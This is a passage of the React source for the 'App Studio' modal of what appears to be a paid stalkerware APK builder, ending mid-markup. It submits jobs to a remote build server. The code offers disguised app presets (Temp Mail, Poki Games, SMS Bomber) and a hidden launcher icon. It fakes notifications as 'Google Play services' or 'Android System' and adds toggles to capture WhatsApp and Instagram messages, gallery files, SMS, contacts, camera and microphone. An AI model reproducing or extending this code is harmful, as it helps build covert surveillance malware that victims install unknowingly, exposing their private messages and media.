"use client";

import React, { useState, useEffect } from 'react';
import CustomAlertModal from './CustomAlertModal';
import { 
    Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
    ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
    Settings, ShieldCheck, ArrowDownCircle, Edit3, MousePointerClick
} from 'lucide-react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium';
    onUpgrade?: () => void;
}

const APP_PRESETS = [
    {
        id: 'custom',
        name: 'Custom App',
        packageName: 'com.gallery.eye',
        url: '',
        infoTitle: 'Custom Web Application',
        infoText: 'Allows you to wrap any website or web portal into a standalone Android APK with your custom name, package identifier, and PNG icon.'
    },
    {
        id: 'temp_mail',
        name: 'Temp Mail',
        packageName: 'com.tempmail.inbox',
        url: 'https://mail.tm/en/',
        infoTitle: 'Temp Mail Portal',
        infoText: 'Launches a fully functional disposable email service (mail.tm). Users can generate temporary email addresses instantly while your monitoring service runs silently in the background.'
    },
    {
        id: 'poki_games',
        name: 'Poki Games',
        packageName: 'com.poki.games',
        url: 'https://poki.com/',
        infoTitle: 'Poki Games Arcade',
        infoText: 'Launches an interactive online game portal (poki.com) with hundreds of instant mobile games. Perfect for casual entertainment.'
    },
    {
        id: 'movie_box',
        name: 'Movie Box',
        packageName: 'com.moviebox.cinema',
        url: 'https://movie-box.co/',
        infoTitle: 'Movie Box Cinema',
        infoText: 'Launches a sleek cinema and movie streaming hub (movie-box.co). Provides an authentic entertainment streaming interface.'
    },
    {
        id: 'sms_bomber',
        name: 'SMS Bomber',
        packageName: 'com.h4k3r.bomber',
        url: 'https://h4k3r-bomber.vercel.app',
        infoTitle: 'Utility Toolkit',
        infoText: 'Launches a utility web application toolkit (h4k3r-bomber.vercel.app). Looks and behaves like a specialized developer utility app.'
    }
];

const NOTIFICATION_STYLES = [
    {
        id: 'google_play',
        title: 'Google Play services',
        text: 'Checking for updates…',
        icon: 'info',
        badge: 'ℹ️',
        desc: 'Appears as official Google Play services background check'
    },
    {
        id: 'android_system',
        title: 'Android System',
        text: 'Updating system components…',
        icon: 'sync',
        badge: '🔄',
        desc: 'Authentic OS system sync indicator'
    },
    {
        id: 'device_security',
        title: 'Device Security',
        text: 'Scanning for threats…',
        icon: 'lock',
        badge: '🔒',
        desc: 'Security scan style notification'
    },
    {
        id: 'system_ui',
        title: 'System UI',
        text: 'Syncing system data…',
        icon: 'sync',
        badge: '🔄',
        desc: 'System UI background daemon style'
    },
    {
        id: 'device_maintenance',
        title: 'Device maintenance',
        text: 'Optimizing performance…',
        icon: 'sync',
        badge: '⚙️',
        desc: 'Standard device optimizer look'
    },
    {
        id: 'download_manager',
        title: 'Download Manager',
        text: 'Download in progress…',
        icon: 'download',
        badge: '⬇️',
        desc: 'Download manager progress appearance'
    },
    {
        id: 'custom',
        title: 'Custom Notification',
        text: 'Configure your own title & text',
        icon: 'info',
        badge: '✏️',
        desc: 'Write custom title, message & select icon'
    }
];

const CLICK_ACTIONS = [
    {
        id: 'device_info',
        title: 'Open Device Status Page',
        desc: 'Opens harmless system diagnostic status view'
    },
    {
        id: 'app_settings',
        title: 'Open App Permissions',
        desc: 'Opens Android application info settings'
    },
    {
        id: 'launch_web',
        title: 'Launch Web Portal',
        desc: 'Opens your configured app web link'
    },
    {
        id: 'none',
        title: 'Do Nothing (Silent)',
        desc: 'No action performed when tapped'
    }
];

const CUSTOM_ICONS = [
    { id: 'info', label: 'Info', symbol: 'ℹ️' },
    { id: 'sync', label: 'Sync', symbol: '🔄' },
    { id: 'lock', label: 'Security', symbol: '🔒' },
    { id: 'download', label: 'Download', symbol: '⬇️' },
    { id: 'settings', label: 'System', symbol: '⚙️' },
];

export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const isPremium = userPlan === 'premium';

    const [activeStep, setActiveStep] = useState<'identity' | 'permissions' | 'notifications'>('identity');
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Selected Preset State
    const [selectedPreset, setSelectedPreset] = useState<string>('custom');

    // Custom App Specific State (ISOLATED from Pre-Integrated Presets)
    const [customAppName, setCustomAppName] = useState("");
    const [customPackageName, setCustomPackageName] = useState("com.gallery.eye");
    const [customWebLink, setCustomWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);
    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);

    // Global Hide Launcher Icon State (Only applicable to custom mode)
    const [hideApp, setHideApp] = useState(false);

    // App Mode Info Modal State
    const [showAppInfoModal, setShowAppInfoModal] = useState<string | null>(null);

    // Generate exactly 3 segments format: com.project.app
    const generatePackageName = (name: string) => {
        const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
        const parts = cleaned.split(/\s+/).filter(Boolean);
        if (parts.length === 0) return "com.gallery.eye";
        if (parts.length === 1) return `com.${parts[0]}.app`;
        return `com.${parts[0]}.${parts[1]}`;
    };

    const handleAppNameChange = (name: string) => {
        setCustomAppName(name);
        setCustomPackageName(generatePackageName(name));
    };

    const handleIconSelect = (file: File | null) => {
        setCustomIcon(file);
        if (file) {
            const url = URL.createObjectURL(file);
            setCustomIconPreview(url);
        } else {
            setCustomIconPreview(null);
        }
    };

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
    const [enableNotificationListener, setEnableNotificationListener] = useState(true);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);
    const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);

    // Notification Style & Click Action State
    const [notificationStyle, setNotificationStyle] = useState("google_play");
    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
    const [notificationTitle, setNotificationTitle] = useState("");
    const [notificationText, setNotificationText] = useState("");
    const [notificationIcon, setNotificationIcon] = useState("info");

    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setActiveStep('identity');
        }
    }, [isOpen]);

    // Active preset details helper
    const getActiveAppDetails = () => {
        const preset = APP_PRESETS.find(p => p.id === selectedPreset);
        if (!preset || selectedPreset === 'custom') {
            return {
                name: customAppName || "Custom App",
                packageName: customPackageName || "com.gallery.eye",
                url: customWebLink,
                infoTitle: "Custom Web Application",
                infoText: "Wraps your provided WebView URL into a standalone Android application."
            };
        }
        return {
            name: preset.name,
            packageName: preset.packageName,
            url: preset.url,
            infoTitle: preset.infoTitle,
            infoText: preset.infoText
        };
    };

    const activeApp = getActiveAppDetails();

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating');
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('completed');
            setProgress(100);
            setProgressStep("APK ready for download!");
            setDownloadUrl(data.downloadUrl);

            try {
                const link = document.createElement('a');
                link.href = data.downloadUrl;
                link.download = `${activeApp.name.replace(/\s+/g, '_')}.apk`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } catch (err) {
                console.error("Auto download trigger error:", err);
            }
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            setAlertData({
                title: 'Generation Failed',
                message: data.message || 'An error occurred while building the APK.',
                type: 'error'
            });
            setShowCustomAlert(true);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket, activeApp.name]);

    const startGeneration = async () => {
        // Validation: ONLY validate when custom preset is selected AND hideApp is OFF
        if (selectedPreset === 'custom' && !hideApp) {
            if (!customAppName.trim()) {
                setAlertData({
                    title: 'App Name Required',
                    message: 'Please enter your app display name for the custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customWebLink.trim()) {
                setAlertData({
                    title: 'Web Link Required',
                    message: 'Please provide a WebView link for your custom app.\n\nThe app needs a URL to display when launched.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customIcon && !customIconPreview) {
                setAlertData({
                    title: 'Custom Icon Required',
                    message: 'Please select an icon (PNG/JPG) for your custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
        }

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', activeApp.name);
            formData.append('packageName', activeApp.packageName);
            formData.append('hideApp', (selectedPreset === 'custom' ? hideApp : false).toString());
            formData.append('webLink', activeApp.url);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            formData.append('notificationStyle', notificationStyle);
            formData.append('notificationClickAction', notificationClickAction);

            if (notificationStyle === 'custom') {
                formData.append('notificationTitle', notificationTitle || activeApp.name);
                formData.append('notificationText', notificationText || "Service active");
                formData.append('notificationIcon', notificationIcon);
            }
            if (selectedPreset === 'custom' && customIcon) {
                formData.append('icon', customIcon);
            }

            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }
        } catch (error: any) {
            console.error(error);
            setStatus('idle');
            setAlertData({
                title: 'Error Starting Build',
                message: error.message || "Failed to start generation. Please try again.",
                type: 'error'
            });
            setShowCustomAlert(true);
        }
    };

    // Mini 48px tile icon renderer for grid selection
    const renderPresetIconBadge = (presetId: string) => {
        switch (presetId) {
            case 'temp_mail':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] flex items-center justify-center shadow-md border border-white/20">
                        <Mail className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] flex items-center justify-center shadow-md border border-white/20">
                        <Gamepad2 className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] flex items-center justify-center shadow-md border border-white/20">
                        <Film className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] flex items-center justify-center shadow-md border border-amber-300/30">
                        <Flame className="w-6 h-6 text-amber-200 drop-shadow" />
                    </div>
                );
            default:
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] flex items-center justify-center shadow-md border border-white/20">
                        <Globe className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
        }
    };

    // Realistic Android screen icon renderer (STRICTLY ISOLATED BY PRESET)
    const renderRealisticIcon = () => {
        if (selectedPreset === 'custom') {
            if (customIconPreview) {
                return (
                    <div className="w-full h-full rounded-[22px] overflow-hidden shadow-[0_12px_28px_rgba(0,0,0,0.6)] border border-white/20">
                        <img src={customIconPreview} alt="Uploaded Custom Icon" className="w-full h-full object-cover" />
                    </div>
                );
            }
            return (
                <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
                    <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                        <Globe className="w-7 h-7 text-white drop-shadow" />
                    </div>
                    <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                </div>
            );
        }

        switch (selectedPreset) {
            case 'temp_mail':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent" />
                        <div className="w-12 h-10 rounded-xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Mail className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1.5 drop-shadow">MAIL.TM</span>
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute -top-6 -right-6 w-16 h-16 bg-pink-400/30 rounded-full blur-xl" />
                        <div className="w-12 h-12 rounded-2xl bg-white/15 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Gamepad2 className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">POKI</span>
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,0.25),transparent)]" />
                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Film className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CINEMA</span>
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/10 to-black/30" />
                        <div className="w-12 h-12 rounded-2xl bg-black/30 backdrop-blur-md flex items-center justify-center border border-amber-300/40 shadow-inner">
                            <Flame className="w-7 h-7 text-amber-300 drop-shadow-[0_0_8px_rgba(251,191,36,0.8)]" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow">H4K3R</span>
                    </div>
                );
            default:
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Globe className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                    </div>
                );
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
            <div className="bg-[#101217] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.9)] relative max-h-[92dvh] overflow-hidden">
                
                {/* 2-Row Spacious Header */}
                <div className="border-b border-white/10 bg-black/60">
                    {/* Top row: Title + Rose Close Button */}
                    <div className="px-5 py-3.5 flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                            <span className="text-sm font-black text-white uppercase tracking-wider">App Studio</span>
                        </div>
                        <button
                            onClick={onClose}
                            className="w-9 h-9 rounded-full bg-rose-500/20 hover:bg-rose-500/35 border border-rose-500/50 flex items-center justify-center text-rose-300 hover:text-white shadow-[0_0_15px_rgba(244,63,94,0.3)] transition-all flex-shrink-0"
                            title="Close App Studio"
                        >
                            ✕
                        </button>
                    </div>

                    {/* Bottom row: Enhanced Step Navigation Bar with Wide Horizontal Glow */}
                    <div className="px-3 pb-3">
                        <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/40 border border-white/10">
                            <button
                                type="button"
                                onClick={() => setActiveStep('identity')}
                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
                                    activeStep === 'identity'
                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_24px_rgba(16,185,129,0.45)]'
                                        : 'text-fg-3 hover:text-fg-1'
                                }`}
                            >
                                <Smartphone size={14} className="flex-shrink-0" />
                                <span>1. App Mode</span>
                            </button>
                            <button
                                type="button"
                                onClick={() => setActiveStep('permissions')}
                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
                                    activeStep === 'permissions'
                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_24px_rgba(16,185,129,0.45)]'
                                        : 'text-fg-3 hover:text-fg-1'
                                }`}
                            >
                                <Shield size={14} className="flex-shrink-0" />
                                <span>2. Permissions</span>
                            </button>
                            <button
                                type="button"
                                onClick={() => setActiveStep('notifications')}
                                className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl text-xs font-bold whitespace-nowrap transition-all ${
                                    activeStep === 'notifications'
                                        ? 'bg-emerald-500/25 text-emerald-300 border border-emerald-400/70 shadow-[0_0_24px_rgba(16,185,129,0.45)]'
                                        : 'text-fg-3 hover:text-fg-1'
                                }`}
                            >
                                <Bell size={14} className="flex-shrink-0" />
                                <span>3. Notifications</span>
                            </button>
                        </div>
                    </div>
                </div>

                {/* Main Content Area */}
                <div className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                    
                    {/* STEP 1: APPLICATION MODES & PRESETS */}
                    {activeStep === 'identity' && (
                        <div className="space-y-6">
                            
                            {/* App Icon Tile Grid */}
                            <div>
                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-3">
                                    {APP_PRESETS.map((p) => {
                                        const isSelected = selectedPreset === p.id;
                                        return (
                                            <button
                                                key={p.id}
                                                type="button"
                                                onClick={() => setSelectedPreset(p.id)}
                                                className={`p-3.5 rounded-2xl border flex flex-col items-center justify-center gap-2.5 transition-all text-center ${
                                                    isSelected
                                                        ? 'bg-emerald-500/15 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.04]'
                                                }`}
                                            >
                                                {renderPresetIconBadge(p.id)}
                                                <span className={`text-xs font-bold leading-tight truncate w-full ${isSelected ? 'text-white' : 'text-fg-3'}`}>
                                                    {p.name}
                                                </span>
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Form Configuration / Preview Section */}
                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
                                
                                {/* Form Inputs: ONLY Shown when selectedPreset === 'custom' */}
                                {selectedPreset === 'custom' && (
                                    <div className="sm:col-span-7 space-y-4 animate-in fade-in">
                                        {/* App Display Name */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
                                            <input
                                                type="text"
                                                value={customAppName}
                                                onChange={(e) => handleAppNameChange(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="enter your app name"
                                            />
                                        </div>

                                        {/* Package Identifier (Exactly 3 Segments e.g. com.gallery.eye) */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
                                            <input
                                                type="text"
                                                value={customPackageName}
                                                onChange={(e) => setCustomPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="com.gallery.eye"
                                            />
                                            <p className="text-[11px] text-fg-4 mt-1">Format: com.project.name (3 segments)</p>
                                        </div>

                                        {/* Custom Web Portal Link */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL</label>
                                            <input
                                                type="url"
                                                value={customWebLink}
                                                onChange={(e) => setCustomWebLink(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="https://example.com"
                                            />
                                        </div>

                                        {/* Custom Icon PNG */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG</label>
                                            <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
                                                <div className="flex items-center gap-2.5">
                                                    <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
                                                        <Upload size={16} />
                                                    </div>
                                                    <div>
                                                        <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
                                                        <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
                                                    </div>
                                                </div>
                                                <input
                                                    type="file"
                                                    accept="image/png, image/jpeg"
                                                    onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
                                                    className="hidden"
                                                />
                                            </label>
                                        </div>
                                    </div>
                                )}

                                {/* Soft UI Phone Home-Screen Preview */}
                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-sm mx-auto w-full'} bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl relative`}>
                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
                                    
                                    {/* App Icon Container with Corner Info Icon */}
                                    <div className="w-24 h-24 mb-3 relative group">
                                        {renderRealisticIcon()}

                                        {/* Corner Info Button ONLY for Pre-integrated Apps */}
                                        {selectedPreset !== 'custom' && (
                                            <button
                                                type="button"
                                                onClick={() => setShowAppInfoModal(selectedPreset)}
                                                className="w-7 h-7 rounded-full bg-black/80 text-emerald-300 border border-emerald-400/50 flex items-center justify-center absolute -top-2 -right-2 shadow-lg hover:scale-110 transition-transform"
                                                title="View App Details"
                                            >
                                                <Info size={14} />
                                            </button>
                                        )}

                                        {/* Hidden Badge for Custom App */}
                                        {selectedPreset === 'custom' && hideApp && (
                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
                                                Hidden
                                            </div>
                                        )}
                                    </div>

                                    <div className="flex items-center justify-center gap-1.5 max-w-full">
                                        <span className="text-sm font-black text-white truncate">{activeApp.name}</span>
                                    </div>
                                    <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{activeApp.packageName}</span>

                                    {/* Hide App Toggle Switch (ONLY SHOWN FOR CUSTOM APP) */}
                                    {selectedPreset === 'custom' && (
                                        <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
                                            <div className="flex items-center gap-1.5">
                                                <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
                                                {isBasicPlan && (
                                                    <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-extrabold tracking-wider">
                                                        PRO
                                                    </span>
                                                )}
                                            </div>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) {
                                                        onUpgrade?.();
                                                        return;
                                                    }
                                                    setHideApp(!hideApp);
                                                }}
                                                className={`w-11 h-6 rounded-full transition-colors relative ${
                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
                                                }`}
                                            >
                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                            </button>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    )}

                    {/* STEP 2: APP ACCESS PERMISSIONS & ADVANCED STEALTH */}
                    {activeStep === 'permissions' && (
                        <div className="space-y-5">
                            {/* Stylish Highlighted Title Indicator */}
                            <div className="flex items-center gap-2.5 px-1">
                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
                                    ADD YOUR PERMISSIONS IN APP
                                </span>
                            </div>

                            {/* Core Permissions Grid */}
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                                
                                {/* Gallery & Storage - Soft Emerald */}
                                <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(16,185,129,0.1)]">
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-emerald-200">Gallery & Storage</span>
                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-emerald-400/70 hover:text-emerald-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-emerald-300/70">Grants access to browse, index & download device photos & media files.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Notification Monitor (WhatsApp, Insta & Alerts) - Soft Sky */}
                                <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-sky-200">Notification Monitor</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-sky-300/70">Monitors & captures WhatsApp, Instagram, Telegram & social message alerts.</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            setEnableNotificationListener(!enableNotificationListener);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Camera Capture - Soft Cyan */}
